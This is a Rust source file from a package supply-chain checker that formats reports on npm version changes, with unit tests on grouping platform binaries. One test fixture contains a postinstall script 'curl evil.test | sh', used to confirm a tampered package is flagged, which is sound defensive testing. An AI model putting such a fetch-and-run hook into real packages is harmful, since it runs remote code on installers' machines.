use carat_core::lockfile::RouteEdge;
use carat_core::model::{Decision, FileRole, OriginClass, ResidualDiff, TransitionLedger, Verdict};
use carat_core::reader::ReadingRecord;
use std::collections::BTreeMap;

pub struct TransitionReportItem {
    pub ledger: TransitionLedger,
    pub decision: Decision,
    pub reading: Option<ReadingRecord>,
    pub residual_diffs: Vec<ResidualDiff>,
    pub route: Vec<RouteEdge>,
    pub approved_by: Option<String>,
}

pub fn render_explain_markdown(item: &TransitionReportItem) -> String {
    let ledger = &item.ledger;
    let decision = &item.decision;
    let mut out = String::new();

    let badge = match (decision.verdict, item.approved_by.as_deref()) {
        (Verdict::Explained, _) => "OK  ",
        (Verdict::Read, _) => "READ",
        (Verdict::Stop, Some(_)) => "APPR",
        (Verdict::Stop, None) => "STOP",
    };

    let ref_ver = ledger
        .reference
        .as_ref()
        .map(|r| r.version.as_str())
        .unwrap_or("(new)");
    let route_str = if item.route.is_empty() {
        String::new()
    } else {
        let chain = item
            .route
            .iter()
            .map(|e| e.to.as_str())
            .collect::<Vec<_>>()
            .join(" -> ");
        format!("  via root -> {chain}")
    };
    out.push_str(&format!(
        "{badge}  {} {} -> {}{route_str}\n",
        ledger.name, ref_ver, ledger.new.version
    ));

    if let Some(ref approver) = item.approved_by {
        out.push_str(&format!("      approved by: {approver}\n"));
    }

    // Anchor summary
    if ledger.anchor.found {
        let commit_short = ledger
            .anchor
            .commit
            .as_deref()
            .map(|c| &c[..c.len().min(12)])
            .unwrap_or("?");
        let method = ledger
            .anchor
            .method
            .map(|m| format!("{m:?}"))
            .unwrap_or_else(|| "unknown".into());
        let repo = ledger.anchor.repository_url.as_deref().unwrap_or("?");
        let dir = ledger
            .anchor
            .repository_directory
            .as_deref()
            .map(|d| format!(" ({d})"))
            .unwrap_or_default();
        out.push_str(&format!(
            "      anchor: {commit_short} via {method} @ {repo}{dir}\n"
        ));
    } else if ledger.anchor.conflict {
        out.push_str(&format!(
            "      anchor: CONFLICT ({})\n",
            ledger.anchor.conflict_details.join(", ")
        ));
    } else if let Some(ref err) = ledger.anchor.lookup_error {
        out.push_str(&format!("      anchor: lookup failed ({err})\n"));
    } else {
        out.push_str(&format!(
            "      anchor: none (tried: {})\n",
            ledger.anchor.methods_tried.join(", ")
        ));
    }

    // Age summary
    if let Some(hours) = decision.published_age_hours {
        let age_str = if hours < 48 {
            format!("{hours}h")
        } else {
            format!("{}d", hours / 24)
        };
        out.push_str(&format!(
            "      published: {} ago ({:?})\n",
            age_str, decision.age_band
        ));
    }

    if ledger.osv_unavailable {
        out.push_str("      warning: OSV advisory lookup unavailable (check network)\n");
    }

    // Balance sheet summary
    let total_files: u64 = ledger.totals.values().map(|t| t.files).sum();
    let total_bytes: u64 = ledger.totals.values().map(|t| t.bytes).sum();
    let carried = ledger
        .totals
        .get(&OriginClass::Carried)
        .cloned()
        .unwrap_or_default();
    let changed_files = total_files.saturating_sub(carried.files);
    let changed_bytes = total_bytes.saturating_sub(carried.bytes);
    let unexplained = ledger
        .totals
        .get(&OriginClass::Unexplained)
        .cloned()
        .unwrap_or_default();

    let accounted_files = total_files.saturating_sub(unexplained.files);
    out.push_str(&format!(
        "      balance: {accounted_files} of {total_files} files accounted for ({} carried, {} changed = {})",
        carried.files,
        changed_files,
        fmt_bytes(changed_bytes),
    ));
    if !ledger.removed_files.is_empty() {
        out.push_str(&format!(", {} removed", ledger.removed_files.len()));
    }
    out.push('\n');

    for class in [
        OriginClass::Source,
        OriginClass::SourceElsewhere,
        OriginClass::SourceNormalized,
        OriginClass::Rebuilt,
        OriginClass::Unexplained,
    ] {
        if let Some(t) = ledger.totals.get(&class) {
            if t.files > 0 {
                let extra = if class == OriginClass::Unexplained {
                    format!(
                        " (code/manifest: {}, non-exec d.ts/map/doc: {})",
                        fmt_bytes(ledger.unexplained_code_bytes),
                        fmt_bytes(ledger.unexplained_non_exec_bytes)
                    )
                } else {
                    String::new()
                };
                out.push_str(&format!(
                    "        - {:<18} {:>4} file(s), {:>9}{}\n",
                    format!("{class:?}"),
                    t.files,
                    fmt_bytes(t.bytes),
                    extra
                ));
            }
        }
    }

    // Inline residual diffs — the core 30-second wedge!
    if !item.residual_diffs.is_empty() {
        out.push_str("      leftover code diff(s) not matched to source:\n");
        for rd in &item.residual_diffs {
            out.push_str(&format!("        --- {} ({}) ---\n", rd.path, fmt_bytes(rd.bytes)));
            for line in rd.diff.lines() {
                out.push_str(&format!("        {line}\n"));
            }
            if rd.truncated {
                out.push_str(&format!(
                    "        ... ({} total diff lines; truncated for display)\n",
                    rd.total_lines
                ));
            }
        }
    } else {
        let unexplained_exec: Vec<_> = ledger
            .files
            .iter()
            .filter(|f| {
                f.class == OriginClass::Unexplained
                    && !matches!(f.role, FileRole::Declaration | FileRole::SourceMap | FileRole::Doc)
            })
            .collect();
        if !unexplained_exec.is_empty() {
            out.push_str("      unexplained executable/manifest files:\n");
            for f in unexplained_exec.iter().take(6) {
                let diffs = if f.significant_manifest_diffs.is_empty() {
                    String::new()
                } else {
                    format!(" [diffs: {}]", f.significant_manifest_diffs.join(", "))
                };
                out.push_str(&format!("        * {} ({}){}\n", f.path, fmt_bytes(f.bytes), diffs));
            }
        }
    }

    if !ledger.breaks.is_empty() {
        out.push_str("      breaks:\n");
        for b in &ledger.breaks {
            let note = ledger
                .break_notes
                .get(b)
                .map(|s| format!(" — {s}"))
                .unwrap_or_default();
            out.push_str(&format!("        ! {}{note}\n", b.human_label()));
        }
    }
    if !ledger.flags.is_empty() {
        out.push_str("      flags:\n");
        for f in &ledger.flags {
            let note = ledger
                .break_notes
                .get(f)
                .map(|s| format!(" — {s}"))
                .unwrap_or_default();
            out.push_str(&format!("        ~ {}{note}\n", f.human_label()));
        }
    }

    if !ledger.new_reach.is_empty() {
        let toks: Vec<String> = ledger
            .new_reach
            .iter()
            .map(|t| {
                let mut s = t.human_label().to_string();
                if ledger.new_reach_in_unexplained.contains(t) {
                    s.push_str(" [in unexplained code]");
                }
                s
            })
            .collect();
        out.push_str(&format!("      new capabilities: {}\n", toks.join("; ")));
    }
    if !ledger.new_hostnames.is_empty() {
        let hosts: Vec<&str> = ledger
            .new_hostnames
            .iter()
            .take(6)
            .map(|s| s.as_str())
            .collect();
        out.push_str(&format!("      new hostnames: {}\n", hosts.join(", ")));
    }

    if let Some(ref r) = item.reading {
        out.push_str(&format!(
            "      reader ({}): {:?}{}\n",
            r.model,
            r.outcome,
            if r.summary.is_empty() {
                String::new()
            } else {
                format!(" — {}", r.summary)
            }
        ));
        if let Some(ref err) = r.error_detail {
            out.push_str(&format!("        note: {err}\n"));
        }
        for finding in &r.findings {
            out.push_str(&format!(
                "        ! [{:?}/{:?}] {}:{}-{}: {}\n",
                finding.category,
                finding.confidence,
                finding.unit_id,
                finding.start_line,
                finding.end_line,
                finding.statement
            ));
        }
    }

    if !decision.stop_reasons.is_empty() && item.approved_by.is_none() {
        out.push_str("      why stopped:\n");
        for r in &decision.stop_reasons {
            out.push_str(&format!("        - {r}\n"));
        }
        out.push_str(&format!(
            "      approve with: carat approve {}\n",
            &decision.ledger_id[..16]
        ));
    }

    out.push_str(&format!(
        "      subject: {} | ledger: {}\n",
        &ledger.subject[..16],
        &decision.ledger_id[..16]
    ));
    out
}

pub fn render_change_summary(
    items: &[TransitionReportItem],
    tampered_files: &[String],
    transition_errors: &[String],
) -> String {
    let total = items.len() + transition_errors.len();
    let unapproved_stops = items
        .iter()
        .filter(|i| i.decision.verdict == Verdict::Stop && i.approved_by.is_none())
        .count()
        + transition_errors.len();
    let explained_count = items
        .iter()
        .filter(|i| i.decision.verdict == Verdict::Explained)
        .count();
    let read_count = items
        .iter()
        .filter(|i| i.decision.verdict == Verdict::Read)
        .count();

    let mut out = String::new();
    if !tampered_files.is_empty() {
        out.push_str(&format!(
            "STOP  protected files modified or lockfile deleted: {}\n\n",
            tampered_files.join(", ")
        ));
    }

    for err in transition_errors {
        out.push_str(&format!("STOP  cannot check transition: {err}\n"));
    }
    if !transition_errors.is_empty() {
        out.push('\n');
    }

    out.push_str(&format!(
        "Carat: {unapproved_stops} of {total} changed package(s) need a person\n\n"
    ));

    let pending_stops: Vec<&TransitionReportItem> = items
        .iter()
        .filter(|i| i.decision.verdict == Verdict::Stop && i.approved_by.is_none())
        .collect();

    // Group identical cross-platform optional native binary siblings so 20+ OS/CPU packages
    // render cleanly without ever hiding a tampered platform with distinct breaks, reach, or diffs.
    let mut family_buckets: BTreeMap<PlatformGroupKey, Vec<usize>> = BTreeMap::new();
    for (idx, item) in pending_stops.iter().enumerate() {
        if let Some(key) = platform_group_key(item) {
            family_buckets.entry(key).or_default().push(idx);
        }
    }

    let mut rendered = vec![false; pending_stops.len()];
    for (idx, item) in pending_stops.iter().enumerate() {
        if rendered[idx] {
            continue;
        }
        if let Some(key) = platform_group_key(item) {
            if let Some(indices) = family_buckets.get(&key) {
                if indices.len() >= 2 {
                    let group: Vec<&TransitionReportItem> =
                        indices.iter().map(|&i| pending_stops[i]).collect();
                    out.push_str(&render_platform_group(&key.family_prefix, &group));
                    out.push('\n');
                    for &i in indices {
                        rendered[i] = true;
                    }
                    continue;
                }
            }
        }
        rendered[idx] = true;
        out.push_str(&render_explain_markdown(item));
        out.push('\n');
    }

    if pending_stops.len() >= 2 {
        let all_ids: Vec<&str> = pending_stops
            .iter()
            .map(|i| &i.decision.ledger_id[..16])
            .collect();
        out.push_str(&format!(
            "To approve all {} stopped package(s) after review:\n  carat approve {}\n\n",
            pending_stops.len(),
            all_ids.join(" ")
        ));
    }

    for item in items
        .iter()
        .filter(|i| i.decision.verdict == Verdict::Read || i.approved_by.is_some())
    {
        let label = if let Some(ref who) = item.approved_by {
            format!(
                "appr  {} -> {} (approved by {who})",
                item.ledger.name, item.ledger.new.version
            )
        } else {
            let summary = item
                .reading
                .as_ref()
                .map(|r| r.summary.as_str())
                .unwrap_or("reader found no concerns");
            format!(
                "read  {} {} -> {}  ({summary})",
                item.ledger.name,
                item.ledger
                    .reference
                    .as_ref()
                    .map(|r| r.version.as_str())
                    .unwrap_or("(new)"),
                item.ledger.new.version
            )
        };
        out.push_str(&format!("{label}\n"));
    }

    if explained_count > 0 {
        out.push_str(&format!("ok    {explained_count} package(s) fully explained\n"));
    }
    if read_count > 0 && explained_count == 0 && unapproved_stops == 0 {
        out.push_str(&format!("ok    {read_count} package(s) read with no concerns\n"));
    }
    out
}

fn fmt_bytes(b: u64) -> String {
    if b < 1024 {
        format!("{b} B")
    } else if b < 1024 * 1024 {
        format!("{:.1} KiB", b as f64 / 1024.0)
    } else {
        format!("{:.1} MiB", b as f64 / (1024.0 * 1024.0))
    }
}

const PLATFORM_MARKERS: &[&str] = &[
    "-darwin-",
    "-linux-",
    "-win32-",
    "-freebsd-",
    "-openbsd-",
    "-netbsd-",
    "-android-",
    "-sunos-",
    "-aix-",
    "-openharmony-",
    "-wasm32-",
];

fn split_platform_family(pkg_name: &str) -> Option<(String, String)> {
    for marker in PLATFORM_MARKERS {
        if let Some(pos) = pkg_name.find(marker) {
            if pos > 0 {
                let prefix = format!("{}-*", &pkg_name[..pos]);
                let platform = pkg_name[pos + 1..].to_string();
                return Some((prefix, platform));
            }
        }
    }
    None
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct PlatformGroupKey {
    family_prefix: String,
    ref_version: Option<String>,
    new_version: String,
    stop_rules: Vec<String>,
    stop_facts: Vec<String>,
    breaks: Vec<String>,
    flags: Vec<String>,
    new_reach: Vec<String>,
    repo_url: Option<String>,
    commit: Option<String>,
}

fn is_version_only_manifest_diff(diff: &str) -> bool {
    let mut saw_change = false;
    for line in diff.lines() {
        if line.starts_with("@@") || line.starts_with("+++") || line.starts_with("---") {
            continue;
        }
        if let Some(body) = line.strip_prefix('+').or_else(|| line.strip_prefix('-')) {
            saw_change = true;
            if !body.trim_start().starts_with("\"version\":") {
                return false;
            }
        }
    }
    saw_change
}

fn is_groupable_residual_diff(rd: &ResidualDiff) -> bool {
    if rd.diff.starts_with("[binary file,") {
        return true;
    }
    if rd.path.eq_ignore_ascii_case("package/package.json") && !rd.truncated {
        return is_version_only_manifest_diff(&rd.diff);
    }
    false
}

fn platform_group_key(item: &TransitionReportItem) -> Option<PlatformGroupKey> {
    // Never collapse a package that has JS/code residual diffs, non-version manifest diffs, or reader findings.
    if item
        .residual_diffs
        .iter()
        .any(|rd| !is_groupable_residual_diff(rd))
    {
        return None;
    }
    if item
        .reading
        .as_ref()
        .map(|r| !r.findings.is_empty())
        .unwrap_or(false)
    {
        return None;
    }
    let (family_prefix, _) = split_platform_family(&item.ledger.name)?;
    Some(PlatformGroupKey {
        family_prefix,
        ref_version: item.ledger.reference.as_ref().map(|r| r.version.clone()),
        new_version: item.ledger.new.version.clone(),
        stop_rules: item
            .decision
            .stop_rules
            .iter()
            .map(|r| format!("{r:?}"))
            .collect(),
        stop_facts: item.decision.stop_facts.iter().cloned().collect(),
        breaks: item
            .ledger
            .breaks
            .iter()
            .map(|b| b.fact_key().to_string())
            .collect(),
        flags: item
            .ledger
            .flags
            .iter()
            .map(|f| f.fact_key().to_string())
            .collect(),
        new_reach: item
            .ledger
            .new_reach
            .iter()
            .map(|r| r.key().to_string())
            .collect(),
        repo_url: item.ledger.anchor.repository_url.clone(),
        commit: item.ledger.anchor.commit.clone(),
    })
}

fn render_platform_group(family_prefix: &str, group: &[&TransitionReportItem]) -> String {
    let first = group[0];
    let ledger = &first.ledger;
    let decision = &first.decision;
    let ref_ver = ledger
        .reference
        .as_ref()
        .map(|r| r.version.as_str())
        .unwrap_or("(new)");

    let mut out = String::new();
    out.push_str(&format!(
        "STOP  {family_prefix} ({} platform packages) {} -> {}\n",
        group.len(),
        ref_ver,
        ledger.new.version
    ));

    let platforms: Vec<String> = group
        .iter()
        .map(|i| {
            split_platform_family(&i.ledger.name)
                .map(|(_, p)| p)
                .unwrap_or_else(|| i.ledger.name.clone())
        })
        .collect();
    out.push_str(&format!("      platforms: {}\n", platforms.join(", ")));

    if ledger.anchor.found {
        let commit_short = ledger
            .anchor
            .commit
            .as_deref()
            .map(|c| &c[..c.len().min(12)])
            .unwrap_or("?");
        let method = ledger
            .anchor
            .method
            .map(|m| format!("{m:?}"))
            .unwrap_or_else(|| "unknown".into());
        let repo = ledger.anchor.repository_url.as_deref().unwrap_or("?");
        out.push_str(&format!("      anchor: {commit_short} via {method} @ {repo}\n"));
    }

    let min_unexp = group
        .iter()
        .map(|i| i.ledger.unexplained_code_bytes)
        .min()
        .unwrap_or(0);
    let max_unexp = group
        .iter()
        .map(|i| i.ledger.unexplained_code_bytes)
        .max()
        .unwrap_or(0);
    let total_unexp: u64 = group.iter().map(|i| i.ledger.unexplained_code_bytes).sum();
    out.push_str(&format!(
        "      unexplained code: {} .. {} per platform (total {})\n",
        fmt_bytes(min_unexp),
        fmt_bytes(max_unexp),
        fmt_bytes(total_unexp)
    ));

    if !ledger.breaks.is_empty() {
        out.push_str("      breaks:\n");
        for b in &ledger.breaks {
            out.push_str(&format!("        ! {}\n", b.human_label()));
        }
    }
    if !ledger.new_reach.is_empty() {
        let toks: Vec<&str> = ledger.new_reach.iter().map(|t| t.human_label()).collect();
        out.push_str(&format!("      new capabilities: {}\n", toks.join("; ")));
    }
    if !decision.stop_reasons.is_empty() {
        out.push_str("      why stopped:\n");
        for r in &decision.stop_reasons {
            out.push_str(&format!("        - {r}\n"));
        }
    }

    let ids: Vec<&str> = group.iter().map(|i| &i.decision.ledger_id[..16]).collect();
    out.push_str(&format!(
        "      approve family with: carat approve {}\n",
        ids.join(" ")
    ));
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use carat_core::model::{
        Anchor, AnchorMethod, LedgerEndpoint, ReachToken, ReadingOutcome, ReleaseAgeBand, StopRule,
    };
    use std::collections::BTreeSet;

    fn mock_platform_stop(
        name: &str,
        ledger_id: &str,
        bytes: u64,
        extra_reach: Option<ReachToken>,
    ) -> TransitionReportItem {
        let mut new_reach = BTreeSet::new();
        let mut stop_rules = BTreeSet::new();
        stop_rules.insert(StopRule::S8);
        let mut stop_facts = BTreeSet::new();
        stop_facts.insert("reading:notrun".to_string());
        if let Some(tok) = extra_reach {
            new_reach.insert(tok);
            stop_rules.insert(StopRule::S7);
            stop_facts.insert(format!("reach:{}", tok.key()));
        }
        TransitionReportItem {
            ledger: TransitionLedger {
                kind: "ledger".into(),
                schema: 2,
                subject: format!("subject_{ledger_id}"),
                ecosystem: "npm".into(),
                name: name.into(),
                reference: Some(LedgerEndpoint {
                    version: "1.2.15".into(),
                    sha512: "a".repeat(128),
                    profile_id: "b".repeat(64),
                    standing: None,
                    published_at: None,
                }),
                new: LedgerEndpoint {
                    version: "1.2.19".into(),
                    sha512: "c".repeat(128),
                    profile_id: "d".repeat(64),
                    standing: None,
                    published_at: None,
                },
                anchor: Anchor {
                    found: true,
                    commit: Some("1234567890abcdef1234567890abcdef12345678".into()),
                    method: Some(AnchorMethod::ProvenanceAsserted),
                    methods_tried: vec!["provenance".into()],
                    conflict: false,
                    conflict_details: vec![],
                    repository_url: Some("https://github.com/rolldown/rolldown".into()),
                    repository_directory: None,
                    workflow_path: None,
                    workflow_ref: None,
                    reachable_from_branch: Some(true),
                    lookup_error: None,
                },
                lock_alarms: BTreeSet::new(),
                archive_facts: BTreeSet::new(),
                files: vec![],
                removed_files: vec![],
                totals: BTreeMap::new(),
                unexplained_code_bytes: bytes,
                unexplained_non_exec_bytes: 0,
                breaks: BTreeSet::new(),
                flags: BTreeSet::new(),
                break_notes: BTreeMap::new(),
                advisory_ids: vec![],
                osv_unavailable: false,
                new_reach,
                new_reach_in_unexplained: BTreeSet::new(),
                new_reach_files: BTreeMap::new(),
                new_hostnames: BTreeSet::new(),
                prior_release_count: 10,
                package_first_published_at: None,
                history_slice_sha256: None,
                tool_version: "0.2.0".into(),
            },
            decision: Decision {
                kind: "decision".into(),
                schema: 2,
                ledger_id: ledger_id.into(),
                subject: format!("subject_{ledger_id}"),
                as_of: "2026-11-20T00:00:00Z".into(),
                policy_version: 2,
                published_age_hours: Some(100),
                age_band: ReleaseAgeBand::Settled,
                reading_required: true,
                reading_outcome: ReadingOutcome::NotRun,
                stop_rules,
                stop_facts,
                stop_reasons: vec!["unexplained code remains".into()],
                verdict: Verdict::Stop,
            },
            reading: None,
            residual_diffs: vec![],
            route: vec![],
            approved_by: None,
        }
    }

    #[test]
    fn groups_identical_platform_siblings_and_isolates_tampered_platform() {
        let items = vec![
            mock_platform_stop("@rolldown/binding-darwin-arm64", "1111111111111111aaaa", 18_000_000, None),
            mock_platform_stop("@rolldown/binding-linux-x64-gnu", "2222222222222222bbbb", 21_000_000, None),
            mock_platform_stop(
                "@rolldown/binding-win32-x64-msvc",
                "3333333333333333cccc",
                23_000_000,
                Some(ReachToken::Proc),
            ),
        ];
        let out = render_change_summary(&items, &[], &[]);
        assert!(out.contains("@rolldown/binding-* (2 platform packages) 1.2.15 -> 1.2.19"), "{out}");
        assert!(out.contains("platforms: darwin-arm64, linux-x64-gnu"), "{out}");
        assert!(out.contains("approve family with: carat approve 1111111111111111 2222222222222222"), "{out}");
        // Tampered win32-x64 with ReachToken::Proc MUST NOT be collapsed into the clean family group!
        assert!(out.contains("STOP  @rolldown/binding-win32-x64-msvc 1.2.15 -> 1.2.19"), "{out}");
        assert!(out.contains("carat approve 1111111111111111 2222222222222222 3333333333333333"), "{out}");
    }

    #[test]
    fn groups_binary_and_version_only_manifest_diffs_but_splits_manifest_script_change() {
        let mut a = mock_platform_stop("lightningcss-darwin-arm64", "aaaa1111111111110000", 8_500_000, None);
        let mut b = mock_platform_stop("lightningcss-linux-x64-gnu", "bbbb2222222222220000", 9_900_000, None);
        let mut c = mock_platform_stop("lightningcss-win32-x64-msvc", "cccc3333333333330000", 9_500_000, None);
        let version_only = ResidualDiff {
            path: "package/package.json".into(),
            bytes: 700,
            total_lines: 5,
            truncated: false,
            diff: "@@ -1,4 +1,4 @@\n {\n-  \"version\": \"1.32.0\",\n+  \"version\": \"1.33.0\",\n }".into(),
        };
        let binary_rd = ResidualDiff {
            path: "package/lightningcss.node".into(),
            bytes: 8_500_000,
            total_lines: 0,
            truncated: false,
            diff: "[binary file, 8500000 bytes]".into(),
        };
        a.residual_diffs = vec![version_only.clone(), binary_rd.clone()];
        b.residual_diffs = vec![version_only, binary_rd.clone()];
        c.residual_diffs = vec![
            ResidualDiff {
                path: "package/package.json".into(),
                bytes: 740,
                total_lines: 6,
                truncated: false,
                diff: "@@ -1,4 +1,5 @@\n {\n-  \"version\": \"1.32.0\",\n+  \"version\": \"1.33.0\",\n+  \"scripts\": {\"postinstall\": \"curl evil.test | sh\"}\n }".into(),
            },
            binary_rd,
        ];
        let out = render_change_summary(&[a, b, c], &[], &[]);
        assert!(out.contains("lightningcss-* (2 platform packages) 1.2.15 -> 1.2.19"), "{out}");
        assert!(out.contains("STOP  lightningcss-win32-x64-msvc 1.2.15 -> 1.2.19"), "{out}");
    }
}
